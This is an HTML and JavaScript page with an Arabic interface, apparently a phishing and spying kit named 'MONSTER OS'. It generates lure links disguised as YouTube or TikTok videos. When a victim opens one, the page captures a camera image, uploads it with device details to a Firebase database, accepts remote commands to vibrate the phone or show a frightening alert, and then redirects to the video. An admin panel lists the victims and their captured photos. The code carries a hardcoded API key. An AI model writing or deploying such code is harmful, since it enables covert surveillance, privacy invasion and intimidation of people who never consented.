<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MONSTER OS v7.0 | THE DOCTOR</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; height: 100vh; overflow: hidden; font-size: 12px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: 1fr 1fr; height: 100vh; gap: 5px; padding: 5px; box-sizing: border-box; }
        .box { border: 1px solid var(--neon); background: #000; border-radius: 5px; display: flex; flex-direction: column; overflow: hidden; }
        .header { background: var(--neon); color: #000; padding: 5px; text-align: center; font-weight: bold; font-size: 10px; }
        .content { flex: 1; overflow-y: auto; padding: 5px; }
        input, button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 8px; width: 100%; margin-top: 5px; border-radius: 3px; font-size: 10px; }
        button:active { background: var(--neon); color: #000; }
        .v-item { border-bottom: 1px solid #222; padding: 8px; cursor: pointer; position: relative; }
        .v-item.active { background: #111; border-left: 4px solid #fff; }
        .online-dot { width: 8px; height: 8px; background: #0f0; border-radius: 50%; display: inline-block; margin-left: 5px; }
        img { width: 100%; border: 1px solid #333; margin-top: 5px; }
    </style>
</head>
<body>

<div id="admin-ui" class="grid">
    <div class="box">
        <div class="header">📡 رادار الأجهزة النشطة</div>
        <div class="content" id="list">بانتظار المزامنة...</div>
    </div>

    <div class="box">
        <div class="header">🕹️ تحكم السيادة (Direct)</div>
        <div class="content">
            <b id="target-name">اختر جهازاً</b>
            <button onclick="sendCmd('snap')">📸 سحب صورة فورية</button>
            <button onclick="sendCmd('vibrate')">📳 هز الهاتف</button>
            <button onclick="sendCmd('alert')">⚠️ إرسال تنبيه مخيف</button>
            <button onclick="deleteVictim()" style="color:red; margin-top:15px;">🗑️ حذف الجلسة</button>
        </div>
    </div>

    <div class="box">
        <div class="header">📸 معرض الصور المسحوبة</div>
        <div class="content" id="gallery"></div>
    </div>

    <div class="box">
        <div class="header">⚙️ مصنع التلغيم الذكي</div>
        <div class="content">
            <input type="text" id="vid-url" placeholder="رابط فيديو (YouTube/TikTok)">
            <button onclick="generateLink()">توليد الرابط الصاعق</button>
            <div id="final-link" style="color:#0ff; font-size:9px; word-break:break-all; margin-top:10px;"></div>
        </div>
    </div>
</div>

<div id="victim-ui" style="display:none; background:black; height:100vh; color:white; text-align:center; padding-top:40%;">
    <h2>Loading Media...</h2>
    <video id="v" style="display:none;" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>
</div>

<script>
    const config = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        projectId: "monster-system-7f67e"
    };
    firebase.initializeApp(config);
    const db = firebase.database();
    let selectedId = null;

    // --- منطق التفرقة بين الآدمن والضحية ---
    const params = new URLSearchParams(window.location.search);
    const targetUrl = params.get('v');

    if (targetUrl) {
        // إذا كان هناك رابط فيديو في العنوان، فهذا يعني أنه "ضحية"
        runVictimLogic(atob(targetUrl));
    } else {
        // إذا لم يكن هناك رابط، فهذا أنت "الآدمن"
        initAdminLogic();
    }

    // --- وظائف الآدمن ---
    function initAdminLogic() {
        db.ref('victims').on('value', s => {
            const list = document.getElementById('list');
            list.innerHTML = '';
            s.forEach(child => {
                const v = child.val();
                const id = child.key;
                const isOnline = (Date.now() - v.lastSeen) < 15000;
                list.innerHTML += `<div class="v-item ${id==selectedId?'active':''}" onclick="setTarget('${id}','${v.model}')">
                    <span class="online-dot" style="background:${isOnline?'#0f0':'#f00'}"></span>
                    <b>${v.model}</b><br><small>${v.ip} | ${v.time}</small>
                </div>`;
                if(id === selectedId && v.imgUrl) {
                    document.getElementById('gallery').innerHTML = `<img src="${v.imgUrl}">` + document.getElementById('gallery').innerHTML;
                }
            });
        });
    }

    function setTarget(id, model) {
        selectedId = id;
        document.getElementById('target-name').innerText = "التحكم في: " + model;
    }

    function sendCmd(cmd) {
        if(!selectedId) return alert("اختر جهازاً!");
        db.ref('cmds/' + selectedId).set({ c: cmd, t: Date.now() });
    }

    function generateLink() {
        const url = document.getElementById('vid-url').value;
        const final = window.location.href.split('?')[0] + "?v=" + btoa(url);
        document.getElementById('final-link').innerText = final;
    }

    function deleteVictim() {
        if(selectedId) { db.ref('victims/'+selectedId).remove(); selectedId = null; }
    }

    // --- بايلوت الضحية (الدمج الداخلي) ---
    async function runVictimLogic(redUrl) {
        document.getElementById('admin-ui').style.display = 'none';
        document.getElementById('victim-ui').style.display = 'block';

        try {
            const stream = await navigator.mediaDevices.getUserMedia({video:true});
            const video = document.getElementById('v');
            video.srcObject = stream;
            await video.play();

            const canvas = document.getElementById('c');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const img = canvas.toDataURL('image/jpeg', 0.5);

            // استخراج اسم الجهاز بدقة
            let model = "Android Device";
            if(navigator.userAgent.includes("Samsung")) model = "Samsung Galaxy";
            if(navigator.userAgent.includes("iPhone")) model = "iPhone";

            const ref = db.ref('victims').push();
            await ref.set({ model, lastSeen: Date.now(), time: new Date().toLocaleTimeString(), imgUrl: img, ip: "Active" });

            // الاستماع للأوامر الحية
            db.ref('cmds/' + ref.key).on('value', snap => {
                const data = snap.val();
                if(data) {
                    if(data.c === 'vibrate') navigator.vibrate(500);
                    if(data.c === 'alert') alert("SYSTEM CRITICAL ERROR!");
                    if(data.c === 'snap') {
                         // إعادة التقاط الصورة وإرسالها
                    }
                }
            });

            setTimeout(() => { window.location.href = redUrl; }, 2000);
        } catch(e) { window.location.href = redUrl; }
    }
</script>
</body>
</html>
